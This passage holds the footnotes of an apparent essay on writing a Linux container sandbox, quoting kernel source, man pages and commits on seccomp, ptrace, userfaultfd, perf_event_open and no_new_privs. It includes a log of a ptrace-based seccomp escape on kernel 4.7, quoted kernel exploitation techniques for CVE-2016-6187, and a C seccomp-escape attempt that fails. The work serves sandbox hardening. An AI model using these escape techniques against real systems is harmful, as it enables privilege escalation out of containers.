=> making a temp directory and a bind mount there...done.
=> pivoting root...done.
=> unmounting /oldroot.EiZRVH...done.
=> trying a user namespace...unsupported? continuing.
=> dropping capabilities...bounding...inheritable...done.
=> filtering syscalls...done.
++ child stopping itself.
++ ptrace failed: Operation not permitted
=> cleaning cgroups...done.
[lizzie@empress l-c-i-500-l]$ sudo ./contained.allow_ptrace -m . -u 0 -c ./ptrace_breaks_seccomp
=> validating Linux version...4.7.6-1-ARCH on x86_64.
=> setting cgroups...memory...cpu...pids...blkio...done.
=> remounting everything with MS_PRIVATE...remounted.
=> making a temp directory and a bind mount there...done.
=> pivoting root...done.
=> unmounting /oldroot.ThyjKm...done.
=> trying a user namespace...unsupported? continuing.
=> dropping capabilities...bounding...inheritable...done.
=> filtering syscalls...done.
++ child stopping itself.
++ child continued
++ got MAGIC_SYSCALL!
++ chmod succeeded, child finished.
++ finished waiting.
=> cleaning cgroups...done.
[lizzie@empress l-c-i-500-l]$ ls -lh ptrace_breaks_seccomp
-rws------ 1 lizzie lizzie 793K Oct 11 14:55 ptrace_breaks_seccomp

```

This seems to have been fixed in June by Kees Cook:

Listing 126: [`run seccomp after ptrace`](https://lkml.org/lkml/2016/6/9/627) on LKML
```
There has been a long-standing (and documented) issue with seccomp
where ptrace can be used to change a syscall out from under seccomp.
This is a problem for containers and other wider seccomp filtered
environments where ptrace needs to remain available, as it allows
for an escape of the seccomp filter.

Since the ptrace attack surface is available for any allowed syscall,
moving seccomp after ptrace doesn't increase the actually available
attack surface. And this actually improves tracing since, for
example, tracers will be notified of syscall entry before seccomp
sends a SIGSYS, which makes debugging filters much easier.

The per-architecture changes do make one (hopefully small)
semantic change, which is that since ptrace comes first, it may
request a syscall be skipped. Running seccomp after this doesn't
make sense, so if ptrace wants to skip a syscall, it will bail
out early similarly to how seccomp was. This means that skipped
syscalls will not be fed through audit, though that likely means
we're actually avoiding noise this way.

This series first cleans up seccomp to remove the now unneeded
two-phase entry, fixes the SECCOMP_RET_TRACE hole (same as the
ptrace hole above), and then reorders seccomp after ptrace on
each architecture.

Thanks,

-Kees

```

This patchset made it into the kernel at 4.8. See for example [93e35e](https://git.kernel.org/cgit/linux/kernel/git/stable/linux-stable.git/commit/?id=93e35efb8de45393cf61ed07f7b407629bf698ea):

```

  [lizzie@empress linux-stable]$ git branch --contains 93e35efb8de45393cf61ed07f7b407629bf698ea
  * linux-4.8.y
    master

```

[52](#fnr.52)

This is, as far as I can tell, only documented in the kernel tree:

Listing 129: [`Documentation/vm/userfaultfd.txt@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/Documentation/vm/userfaultfd.txt?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3)
```
= Userfaultfd =

== Objective ==

Userfaults allow the implementation of on-demand paging from userland
and more generally they allow userland to take control of various
memory page faults, something otherwise only the kernel code could do.

[...]

= API ==

When first opened the userfaultfd must be enabled invoking the
UFFDIO_API ioctl specifying a uffdio_api.api value set to UFFD_API (or
a later API version) which will specify the read/POLLIN protocol
userland intends to speak on the UFFD and the uffdio_api.features
userland requires. The UFFDIO_API ioctl if successful (i.e. if the
requested uffdio_api.api is spoken also by the running kernel and the
requested features are going to be enabled) will return into
uffdio_api.features and uffdio_api.ioctls two 64bit bitmasks of
respectively all the available features of the read(2) protocol and
the generic ioctl available.

Once the userfaultfd has been enabled the UFFDIO_REGISTER ioctl should
be invoked (if present in the returned uffdio_api.ioctls bitmask) to
register a memory range in the userfaultfd by setting the
uffdio_register structure accordingly. The uffdio_register.mode
bitmask will specify to the kernel which kind of faults to track for
the range (UFFDIO_REGISTER_MODE_MISSING would track missing
pages). The UFFDIO_REGISTER ioctl will return the
uffdio_register.ioctls bitmask of ioctls that are suitable to resolve
userfaults on the range registered. Not all ioctls will necessarily be
supported for all memory types depending on the underlying virtual
memory backend (anonymous memory vs tmpfs vs real filebacked
mappings).

Userland can use the uffdio_register.ioctls to manage the virtual
address space in the background (to add or potentially also remove
memory from the userfaultfd registered range). This means a userfault
could be triggering just before userland maps in the background the
user-faulted page.

The primary ioctl to resolve userfaults is UFFDIO_COPY. That
atomically copies a page into the userfault registered range and wakes
up the blocked userfaults (unless uffdio_copy.mode &
UFFDIO_COPY_MODE_DONTWAKE is set). Other ioctl works similarly to
UFFDIO_COPY. They're atomic as in guaranteeing that nothing can see an
half copied page since it'll keep userfaulting until the copy has
finished.

```

[53](#fnr.53)

Jann Horn described this to me, [and linked to his vulnerability and
exploit](https://bugs.chromium.org/p/project-zero/issues/detail?id%3D808):

> In order to make exploitation more reliable, the attacker should
> be able to pause code execution in the kernel between the writability
> check of the target file and the actual write operation. This can be
> done by abusing the writev() syscall and FUSE: The attacker mounts a
> FUSE filesystem that artificially delays read accesses, then mmap()s a
> file containing a struct iovec from that FUSE filesystem and passes
> the result of mmap() to writev(). (Another way to do this would be to
> use the userfaultfd() syscall.)

It was also used by [Vitaly Nikolenko in his proof-of-concept for
CVE-2016-6187](https://cyseclabs.com/blog/cve-2016-6187-heap-off-by-one-exploit):

> […]
>
> If we could overwrite the cleanup function pointer (remember that this
> object is now allocated in user space), then we'll have arbitrary code
> execution with CPL=0. The only problem is that subprocess\_info object
> allocation and freeing happens on the same path. One way to modify the
> object's function pointer is to somehow suspend the execution before
> info->cleanup)(info) gets called and set the function pointer to our
> privilege escalation payload. I could have found other objects of the
> same size with two "separate" paths for allocation and function
> triggering but I needed a reason to try userfaultfd() and the page
> splitting idea.
>
> The userfaultfd syscall can be used to handle page faults in user
> space. We can allocate a page in user space and set up a handler (as a
> separate thread); when this page is accessed either for reading or
> writing, execution will be transferred to the user-space handler to
> deal with the page fault. There's nothing new here and this was
> mentioned by [Jann Hornh](https://bugs.chromium.org/p/project-zero/issues/detail?id%3D808)
>
> […].
>
> * Allocate two consecutive pages, split the object over these two
>   pages (as before) and set up the page handler for the second page.
> * When the user-space PF is triggered by memset, set up another user-space PF handler but for the first page.
> * The next user-space PF will be triggered when object variables
>   (located in the first page) get initialised in
>   call\_usermodehelper\_setup. At this point, set up another PF for
>   the second page.
> * Finally, the last user-space PF handler can modify the cleanup
>   function pointer (by setting it to our privilege escalation
>   payload or a ROP chain) and set the path member to 0 (since these
>   members are all located in the first page and already
>   initialised).
>
> Setting up user-space PF handlers for already "page-faulted" pages
> can be accomplished by munmapping/mapping these pages again and then
> passing them to userfaultfd(). The PoC for 4.5.1 can be found
> [here](https://cyseclabs.com/exploits/matreshka.c). There's nothing specific to the kernel version though (it
> should work on all vulnerable kernels). There's no privilege
> escalation payload but the PoC will execute instructions at the
> user-space address 0xdeadbeef.

[54](#fnr.54)
Listing 131: [`man 2 perf_event_open`](http://man7.org/linux/man-pages/man2/perf_event_open.2.html)
```
    PERF_EVENT_OPEN(2) -- 2016-07-17 -- Linux -- Linux Programmer's Manual

    NAME
            perf_event_open - set up performance monitoring

    SYNOPSIS
            #include <linux/perf_event.h>
            #include <linux/hw_breakpoint.h>

            int perf_event_open(struct perf_event_attr *attr,
                                            pid_t pid, int cpu, int group_fd,
                                            unsigned long flags);

            Note: There  is no glibc  wrapper for this system  call; see
            NOTES.

    DESCRIPTION
            [...]

    Arguments

         The pid and cpu arguments allow specifying which process and
         CPU to monitor:

         pid == 0 and cpu == -1
                 This measures the calling process/thread on any CPU.

         pid == 0 and cpu >= 0
                 This  measures  the  calling process/thread  only  when
                 running on the specified CPU.

         pid > 0 and cpu == -1
                 This measures the specified process/thread on any CPU.

         pid > 0 and cpu >= 0
                 This  measures the  specified process/thread  only when
                 running on the specified CPU.

         pid == -1 and cpu >= 0
                 This  measures all  processes/threads on  the specified
                 CPU.   This  requires  CAP_SYS_ADMIN  capability  or  a
                 /proc/sys/kernel/perf_event_paranoid value of less than
                 1.

         pid == -1 and cpu == -1
                 This setting is invalid and will return an error.

```

If a pid is specified, the corresponding process is found within the
namespace:

Listing 132: [`kernel/events/core.c:9376@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/events/core.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n9376)
```
    /**
     * sys_perf_event_open - open a performance event, associate it to a task/cpu
     *
     * @attr_uptr:  event_id type attributes for monitoring/sampling
     * @pid:                target pid
     * @cpu:                target cpu
     * @group_fd:           group leader event fd
     */
    SYSCALL_DEFINE5(perf_event_open,
                    struct perf_event_attr __user *, attr_uptr,
                    pid_t, pid, int, cpu, int, group_fd, unsigned long, flags)
    {
            /* ... */

            if (pid != -1 && !(flags & PERF_FLAG_PID_CGROUP)) {
                    task = find_lively_task_by_vpid(pid);
                    if (IS_ERR(task)) {
                            err = PTR_ERR(task);
                            goto err_group_fd;
                    }
            }

            /* ... */
    }

```

Listing 133: [`kernel/events/core.c:3621@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/events/core.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n3621)
```
    static struct task_struct *
    find_lively_task_by_vpid(pid_t vpid)
    {
            struct task_struct *task;

            rcu_read_lock();
            if (!vpid)
                    task = current;
            else
                    task = find_task_by_vpid(vpid);
            if (task)
                    get_task_struct(task);
            rcu_read_unlock();

            if (!task)
                    return ERR_PTR(-ESRCH);

            return task;
    }

```

Listing 134: [`kernel/pid.c:459@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/pid.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n459)
```
    struct task_struct *find_task_by_vpid(pid_t vnr)
    {
            return find_task_by_pid_ns(vnr, task_active_pid_ns(current));
    }

```

[55](#fnr.55)

The Relevant commit is [`0161028`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id%3D0161028b7c8aebef64194d3d73e43bc3b53b5c66), whose commit message gives a good
description of the problems:

```
commit 0161028b7c8aebef64194d3d73e43bc3b53b5c66
Author: Andy Lutomirski <redacted>
Date:   Mon May 9 15:48:51 2016 -0700

    perf/core: Change the default paranoia level to 2

    Allowing unprivileged kernel profiling lets any user dump follow kernel
    control flow and dump kernel registers.  This most likely allows trivial
    kASLR bypassing, and it may allow other mischief as well.  (Off the top
    of my head, the PERF_SAMPLE_REGS_INTR output during /dev/urandom reads
    could be quite interesting.)

    Signed-off-by: Andy Lutomirski <redacted>
    Acked-by: Kees Cook <redacted>
    Signed-off-by: Linus Torvalds <redacted>

diff --git a/Documentation/sysctl/kernel.txt b/Documentation/sysctl/kernel.txt
index 57653a4..fcddfd5 100644
--- a/Documentation/sysctl/kernel.txt
+++ b/Documentation/sysctl/kernel.txt
@@ -645,7 +645,7 @@ allowed to execute.
 perf_event_paranoid:

 Controls use of the performance events system by unprivileged
-users (without CAP_SYS_ADMIN).  The default value is 1.
+users (without CAP_SYS_ADMIN).  The default value is 2.

  -1: Allow use of (almost) all events by all users
 >=0: Disallow raw tracepoint access by users without CAP_IOC_LOCK
diff --git a/kernel/events/core.c b/kernel/events/core.c
index 4e2ebf6..c0ded24 100644
--- a/kernel/events/core.c
+++ b/kernel/events/core.c
@@ -351,7 +351,7 @@ static struct srcu_struct pmus_srcu;
  *   1 - disallow cpu events for unpriv
  *   2 - disallow kernel profiling for unpriv
  */
-int sysctl_perf_event_paranoid __read_mostly = 1;
+int sysctl_perf_event_paranoid __read_mostly = 2;

 /* Minimum for 512 kiB + 1 user control page */

```

This is included in 4.6:

```

[lizzie@empress linux]$ git tag --contains 0161028b7c8aebef64194d3d73e43bc3b53b5c66
v4.6
v4.7
v4.7-rc1
v4.7-rc2
v4.7-rc3
v4.7-rc4
v4.7-rc5
v4.7-rc6
v4.7-rc7
v4.8
v4.8-rc1
v4.8-rc2
v4.8-rc3
v4.8-rc4
v4.8-rc5
v4.8-rc6
v4.8-rc7
v4.8-rc8

```

Thanks to Jann Horn for pointing this out.

[56](#fnr.56)

[`Documentation/prctl/no_new_privs.txt@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/Documentation/prctl/no_new_privs.txt?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3)

> The execve system call can grant a newly-started program privileges
> that its parent did not have. The most obvious examples are
> setuid/setgid programs and file capabilities. […] Any task can
> set no\_new\_privs. Once the bit is set, it is inherited across fork,
> clone, and execve and cannot be unset. With no\_new\_privs set,
> execve promises not to grant the privilege to do anything that could
> not have been done without the execve call.

Listing 136: [`man 2 seccomp`](http://man7.org/linux/man-pages/man2/seccomp.2.html)
```
		In order to  use the SECCOMP_SET_MODE_FILTER operation,
		either   the  caller   must   have  the   CAP_SYS_ADMIN
		capability in  its user  namespace, or the  thread must
		already have the no_new_privs bit set.  If that bit was
		not  already set  by an  ancestor of  this thread,  the
		thread must make the following call:

		    prctl(PR_SET_NO_NEW_PRIVS, 1);

		Otherwise,  the SECCOMP_SET_MODE_FILTER  operation will
		fail  and return  EACCES  in  errno.  This  requirement
		ensures  that an  unprivileged process  cannot apply  a
		malicious filter and then invoke a set-user-ID or other
		privileged  program using  execve(2), thus  potentially
		compromising  that program.   (Such a  malicious filter
		might, for  example, cause an attempt  to use setuid(2)
		to  set the  caller's user  IDs to  non-zero values  to
		instead  return 0  without actually  making the  system
		call.   Thus,   the  program  might  be   tricked  into
		retaining superuser  privileges in  circumstances where
		it is possible  to influence it to  do dangerous things
		because it did not actually drop privileges.)

```

It took me a while to internalize this behavior. My impression was
that without `PR_SET_NO_NEW_PRIVS`, seccomp filters would be dropped
across a `setuid` exec. This would lead to an easy way to escape
`seccomp`:

* Create a setuid executable that calls some filtered syscall.
* Become a non-root user.
* Execute that setuid executable.

But that's actually not the case. Instead, you just can't set seccomp
filters unless you have one of the following:

* `PR_SET_NO_NEW_PRIVS` == 1
* `CAP_SYS_ADMIN`

and so libseccomp sets `PR_SET_NO_NEW_PRIVS` by default.

Here's the code I thought would work:

Listing 137: `setuidd_lower_reexec_and_escape.c`
```
/* -*- compile-command: "gcc -Wall -Werror -static setuidd_lower_reexec_and_escape.c -o setuidd_lower_reexec_and_escape" -*- */
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>

int main (int argc, char **argv)
{
	if (argc == 1) {
		if (setresuid(99, 99, 99)) {
			fprintf(stderr, "++ setresuid failed: %m\n");
			return 1;
		}
		if (execve(argv[0], (char *[]) {argv[0], "-", 0}, NULL)) {
			fprintf(stderr, "++ execve failed: %m\n");
			return 1;
		}
	} else {
		uid_t a, b, c = 0;
		getresuid(&a, &b, &c);
		fprintf(stderr, "++ we're %u/%u/%u.\n", a, b, c);
		if (ioctl(STDIN_FILENO, TIOCSTI, "!")) {
		     fprintf(stderr, "++ ioctl failed: %m\n");
		     return 1;
		}
	}
}

```

but it doesn't :

```

[lizzie@empress l-c-i-500-l]$sudo chown root setuidd_lower_reexec_and_escape
[lizzie@empress l-c-i-500-l]$sudo chmod 4007 setuidd_lower_reexec_and_escape
[lizzie@empress l-c-i-500-l]$sudo ./contained -m . -u 0 -c ./setuidd_lower_reexec_and_escape
=> validating Linux version...4.7.10.201610222037-1-grsec on x86_64.
=> setting cgroups...memory...cpu...pids...blkio...done.
=> setting rlimit...done.
=> remounting everything with MS_PRIVATE...remounted.
=> making a temp directory and a bind mount there...done.
=> pivoting root...done.
=> unmounting /oldroot.ZM2vnz...done.
=> trying a user namespace...writing /proc/2095/uid_map...writing
/proc/2095/gid_map...done.
=> switching to uid 0 / gid 0...done.
=> dropping capabilities...bounding...inheritable...done.
=> filtering syscalls...done.  ++ we're 99/99/99.  ++ ioctl failed:
Operation not permitted
=> cleaning cgroups...done.

```

Here's the code responsible for that check:

Listing 138: [`kernel/seccomp.c:340@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/seccomp.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n340)
```
/**
 * seccomp_prepare_filter: Prepares a seccomp filter for use.
 * @fprog: BPF program to install
 *
 * Returns filter on success or an ERR_PTR on failure.
 */
static struct seccomp_filter *seccomp_prepare_filter(struct sock_fprog *fprog)
{
	struct seccomp_filter *sfilter;
	int ret;
	const bool save_orig = IS_ENABLED(CONFIG_CHECKPOINT_RESTORE);

	if (fprog->len == 0 || fprog->len > BPF_MAXINSNS)
		return ERR_PTR(-EINVAL);

	BUG_ON(INT_MAX / fprog->len < sizeof(struct sock_filter));

	/*
	 * Installing a seccomp filter requires that the task has
	 * CAP_SYS_ADMIN in its namespace or be running with no_new_privs.
	 * This avoids scenarios where unprivileged tasks can affect the
	 * behavior of privileged children.
	 */
	if (!task_no_new_privs(current) &&
	    security_capable_noaudit(current_cred(), current_user_ns(),
				     CAP_SYS_ADMIN) != 0)
		return ERR_PTR(-EACCES);

	/* Allocate a new seccomp_filter */
	sfilter = kzalloc(sizeof(*sfilter), GFP_KERNEL | __GFP_NOWARN);
	if (!sfilter)
		return ERR_PTR(-ENOMEM);

	ret = bpf_prog_create_from_user(&sfilter->prog, fprog,
					seccomp_check_filter, save_orig);
	if (ret < 0) {
		kfree(sfilter);
		return ERR_PTR(ret);
	}

	atomic_set(&sfilter->usage, 1);

	return sfilter;
}

```

and the code that unconditionally propagates seccomp filters across exec:

Listing 139: [`kernel/fork.c:1268@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/fork.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#1268)
```
static void copy_seccomp(struct task_struct *p)
{
#ifdef CONFIG_SECCOMP
	/*
	 * Must be called with sighand->lock held, which is common to
	 * all threads in the group. Holding cred_guard_mutex is not
	 * needed because this new task is not yet running and cannot
	 * be racing exec.
	 */
	assert_spin_locked(&current->sighand->siglock);

	/* Ref-count the new filter user, and assign it. */
	get_seccomp_filter(current);
	p->seccomp = current->seccomp;

	/*
	 * Explicitly enable no_new_privs here in case it got set
	 * between the task_struct being duplicated and holding the
	 * sighand lock. The seccomp state and nnp must be in sync.
	 */
	if (task_no_new_privs(current))
		task_set_no_new_privs(p);

	/*
	 * If the parent gained a seccomp mode after copying thread
	 * flags and between before we held the sighand lock, we have
	 * to manually enable the seccomp thread flag here.
	 */
	if (p->seccomp.mode != SECCOMP_MODE_DISABLED)
		set_tsk_thread_flag(p, TIF_SECCOMP);
#endif
}

```

(called by `copy_process` in [`kernel/fork.c@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/fork.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3)).

[57](#fnr.57)
Listing 170: [`man 2 _sysctl`](http://man7.org/linux/man-pages/man2/_sysctl.2.html)
```
NOTES
	Glibc does not provide a  wrapper for this system call; call
	it using  syscall(2).  Or rather...   don't call it:  use of
	this system  call has  long been discouraged,  and it  is so
	unloved that  it is likely  to disappear in a  future kernel
	version.   Since  Linux 2.6.24,  uses  of  this system  call
	result in warnings  in the kernel log.  Remove  it from your
	programs now; use the /proc/sys interface instead.

	This  system  call  is  available only  if  the  kernel  was
	configured with the CONFIG_SYSCTL_SYSCALL option.

```

Listing 171: [`init/Kconfig:1420@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/init/Kconfig?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n1420)
```
config SYSCTL_SYSCALL
	bool "Sysctl syscall support" if EXPERT
	depends on PROC_SYSCTL
	default n
	select SYSCTL
	---help---
	  sys_sysctl uses binary paths that have been found challenging
	  to properly maintain and use.  The interface in /proc/sys
	  using paths with ascii names is now the primary path to this
	  information.

	  Almost nothing using the binary sysctl interface so if you are
	  trying to save some space it is probably safe to disable this,
	  making your kernel marginally smaller.

	  If unsure say N here.

```

[58](#fnr.58)
Listing 172: [`man 2 alloc_hugepages`](http://man7.org/linux/man-pages/man2/alloc_hugepages.2.html)
```
DESCRIPTION
	The system calls alloc_hugepages() and free_hugepages() were
	introduced  in Linux  2.5.36  and removed  again in  2.5.54.
	They  existed  only  on  i386  and  ia64  (when  built  with
	CONFIG_HUGETLB_PAGE).  In Linux  2.4.20, the syscall numbers
	exist, but the calls fail with the error ENOSYS.

```

[59](#fnr.59)
Listing 173: [`man 2 bdflush`](http://man7.org/linux/man-pages/man2/bdflush.2.html)
```
DESCRIPTION
	Note: Since  Linux 2.6, this  system call is  deprecated and
	does nothing.   It is  likely to  disappear altogether  in a
	future  kernel release.   Nowadays,  the  task performed  by
	bdflush() is handled by the kernel pdflush thread.

```

[60](#fnr.60)
Listing 169: [`man 2 create_module`](http://man7.org/linux/man-pages/man2/create_module.2.html)
```
DESCRIPTION
	Note: This  system call  is present  only in  kernels before
	Linux 2.6.

```

[61](#fnr.61)
Listing 167: [`man 2 nfsservctl`](http://man7.org/linux/man-pages/man2/nfsservctl.2.html)
```
NAME
	nfsservctl - syscall interface to kernel nfs daemon

SYNOPSIS
	#include <linux/nfsd/syscall.h>

	long nfsservctl(int cmd, struct nfsctl_arg *argp,
				 union nfsctl_res *resp);

DESCRIPTION
	Note: Since  Linux 3.1, this  system call no  longer exists.
	It  has  been  replaced  by  a set  of  files  in  the  nfsd
	filesystem; see nfsd(7).

```

[62](#fnr.62)
Listing 158: [`man 2 syscalls`](http://man7.org/linux/man-pages/man2/syscalls.2.html)
```
	perfctr(2)	2.2	Sparc; removed in 2.6.34

```

[63](#fnr.63)
Listing 146: [`man 2 get_kernel_syms`](http://man7.org/linux/man-pages/man2/get_kernel_syms.2.html)
```
GET_KERNEL_SYMS(2) -- 2016-10-08 -- Linux -- Linux Programmer's Manual

NAME
	get_kernel_syms  -  retrieve   exported  kernel  and  module
	symbols

SYNOPSIS
	#include <linux/module.h>

	int get_kernel_syms(struct kernel_sym *table);

	Note:  No declaration  of this  system call  is provided  in
	glibc headers; see NOTES.

DESCRIPTION
	Note: This  system call  is present  only in  kernels before
	Linux 2.6.

```

[64](#fnr.64)
Listing 154: [`man 2 setup`](http://man7.org/linux/man-pages/man2/setup.2.html)
```
SETUP(2) -- 2008-12-03 -- Linux -- Linux Programmer's Manual

NAME
	setup - setup devices and filesystems, mount root filesystem

	[...]

VERSIONS
	Since Linux 2.1.121, no such function exists anymore.

```

[65](#fnr.65)

[`man 2 clock_settime`](http://man7.org/linux/man-pages/man2/clock_settime.2.html) is unfortunately pretty vague:

Listing 160: [`man 2 clock_settime`](http://man7.org/linux/man-pages/man2/clock_settime.2.html)
```
    CLOCK_GETRES(2) -- 2016-05-09 -- Linux Programmer's Manual

    NAME
            clock_getres, clock_gettime, clock_settime  - clock and time
            functions

            [...]

    ERRORS

            EFAULT
                    tp points outside the accessible address space.

            EINVAL
                    The clk_id specified is not supported on this system.

            EPERM
                    clock_settime()  does not  have permission  to set  the
                    clock indicated.

```

but you can see in the source that `CLOCK_REALTIME` is the only clock
with `.clock_set` and `.clock_adj` set:

Listing 161: [`kernel/time/posix-timers.c:282@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/time/posix-timers.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n282)
```
    /*
     * Initialize everything, well, just everything in Posix clocks/timers ;)
     */
    static __init int init_posix_timers(void)
    {
            struct k_clock clock_realtime = {
                    .clock_getres   = posix_get_hrtimer_res,
                    .clock_get      = posix_clock_realtime_get,
                    .clock_set      = posix_clock_realtime_set,
                    .clock_adj      = posix_clock_realtime_adj,
                    .nsleep         = common_nsleep,
                    .nsleep_restart = hrtimer_nanosleep_restart,
                    .timer_create   = common_timer_create,
                    .timer_set      = common_timer_set,
                    .timer_get      = common_timer_get,
                    .timer_del      = common_timer_del,
            };
            struct k_clock clock_monotonic = {
                    .clock_getres   = posix_get_hrtimer_res,
                    .clock_get      = posix_ktime_get_ts,
                    .nsleep         = common_nsleep,
                    .nsleep_restart = hrtimer_nanosleep_restart,
                    .timer_create   = common_timer_create,
                    .timer_set      = common_timer_set,
                    .timer_get      = common_timer_get,
                    .timer_del      = common_timer_del,
            };
            struct k_clock clock_monotonic_raw = {
                    .clock_getres   = posix_get_hrtimer_res,
                    .clock_get      = posix_get_monotonic_raw,
            };
            struct k_clock clock_realtime_coarse = {
                    .clock_getres   = posix_get_coarse_res,
                    .clock_get      = posix_get_realtime_coarse,
            };
            struct k_clock clock_monotonic_coarse = {
                    .clock_getres   = posix_get_coarse_res,
                    .clock_get      = posix_get_monotonic_coarse,
            };
            struct k_clock clock_tai = {
                    .clock_getres   = posix_get_hrtimer_res,
                    .clock_get      = posix_get_tai,
                    .nsleep         = common_nsleep,
                    .nsleep_restart = hrtimer_nanosleep_restart,
                    .timer_create   = common_timer_create,
                    .timer_set      = common_timer_set,
                    .timer_get      = common_timer_get,
                    .timer_del      = common_timer_del,
            };
            struct k_clock clock_boottime = {
                    .clock_getres   = posix_get_hrtimer_res,
                    .clock_get      = posix_get_boottime,
                    .nsleep         = common_nsleep,
                    .nsleep_restart = hrtimer_nanosleep_restart,
                    .timer_create   = common_timer_create,
                    .timer_set      = common_timer_set,
                    .timer_get      = common_timer_get,
                    .timer_del      = common_timer_del,
            };

            posix_timers_register_clock(CLOCK_REALTIME, &clock_realtime);
            posix_timers_register_clock(CLOCK_MONOTONIC, &clock_monotonic);
            posix_timers_register_clock(CLOCK_MONOTONIC_RAW, &clock_monotonic_raw);
            posix_timers_register_clock(CLOCK_REALTIME_COARSE, &clock_realtime_coarse);
            posix_timers_register_clock(CLOCK_MONOTONIC_COARSE, &clock_monotonic_coarse);
            posix_timers_register_clock(CLOCK_BOOTTIME, &clock_boottime);
            posix_timers_register_clock(CLOCK_TAI, &clock_tai);

            posix_timers_cache = kmem_cache_create("posix_timers_cache",
                                            sizeof (struct k_itimer), 0, SLAB_PANIC,
                                            NULL);
            return 0;
    }

```

and that those methods go through `settimeofday` and `adjtimex`, which
are both also gated by `CAP_SYS_TIME`.

Listing 162: [`kernel/time/posix-timers.c:212@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/time/posix-timers.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n212)
```
    /* Set clock_realtime */
    static int posix_clock_realtime_set(const clockid_t which_clock,
                                        const struct timespec *tp)
    {
            return do_sys_settimeofday(tp, NULL);
    }

    static int posix_clock_realtime_adj(const clockid_t which_clock,
                                        struct timex *t)
    {
            return do_adjtimex(t);
    }

```

Listing 163: [`security/commoncap.c:106@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/security/commoncap.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n106)
```
    /**
     * cap_settime - Determine whether the current process may set the system clock
     * @ts: The time to set
     * @tz: The timezone to set
     *
     * Determine whether the current process may set the system clock and timezone
     * information, returning 0 if permission granted, -ve if denied.
     */
    int cap_settime(const struct timespec64 *ts, const struct timezone *tz)
    {
            if (!capable(CAP_SYS_TIME))
                    return -EPERM;
            return 0;
    }

```

Listing 164: [`kernel/time/ntp.c:657@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/time/ntp.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n657)
```
    /**
     * ntp_validate_timex - Ensures the timex is ok for use in do_adjtimex
     */
    int ntp_validate_timex(struct timex *txc)
    {
            if (txc->modes & ADJ_ADJTIME) {
                    /* singleshot must not be used with any other mode bits */
                    if (!(txc->modes & ADJ_OFFSET_SINGLESHOT))
                            return -EINVAL;
                    if (!(txc->modes & ADJ_OFFSET_READONLY) &&
                        !capable(CAP_SYS_TIME))
                            return -EPERM;
            } else {
                    /* In order to modify anything, you gotta be super-user! */
                     if (txc->modes && !capable(CAP_SYS_TIME))
                            return -EPERM;
                    /*
                     * if the quartz is off by more than 10% then
                     * something is VERY wrong!
                     */
                    if (txc->modes & ADJ_TICK &&
                        (txc->tick <  900000/USER_HZ ||
                         txc->tick > 1100000/USER_HZ))
                            return -EINVAL;
            }

            /* ... *
    }

```

[66](#fnr.66)
Listing 165: [`man 3 adjtime`](http://man7.org/linux/man-pages/man3/adjtime.3.html)
```
    ADJTIME(3) -- 2016-03-15 -- Linux -- Linux Programmer's Manual

    NAME
            adjtime - correct the time to synchronize the system clock

            [...]

    ERRORS

            EINVAL
                    The adjustment in delta is outside the permitted range.

            EPERM
                    The caller does not have sufficient privilege to adjust
                    the time.  Under Linux,  the CAP_SYS_TIME capability is
                    required.

```

[67](#fnr.67)
Listing 159: [`man 2 pciconfig_read`](http://man7.org/linux/man-pages/man2/pciconfig_read.2.html)
```
PCICONFIG_READ(2) -- 2016-07-17 -- Linux -- Linux Programmer's Manual

NAME
	pciconfig_read,  pciconfig_write,   pciconfig_iobase  -  pci
	device information handling
	[...]
ERRORS
	[...]
	EPERM
		User does not have  the CAP_SYS_ADMIN capability.  This
		does not apply to pciconfig_iobase().

```

[68](#fnr.68)

Too many too list, but see [`man 2 quotactl`](http://man7.org/linux/man-pages/man2/quotactl.2.html).

[69](#fnr.69)
Listing 143: [`man 2 ustat`](http://man7.org/linux/man-pages/man2/ustat.2.html)
```
    USTAT(2) -- 2003-08-04 -- Linux -- Linux Programmer's Manual

    NAME
            ustat - get filesystem statistics

    SYNOPSIS
            #include <sys/types.h>
            #include <unistd.h>    /* libc[45] */
            #include <ustat.h>     /* glibc2 */

            int ustat(dev_t dev, struct ustat *ubuf);

    DESCRIPTION
            ustat() returns information about a mounted filesystem.  dev
            is a device number identifying a device containing a mounted
            filesystem.  ubuf  is a  pointer to  a ustat  structure that
            contains the following members:

                daddr_t f_tfree;      /* Total free blocks */
                ino_t   f_tinode;     /* Number of free inodes */
                char    f_fname[6];   /* Filsys name */
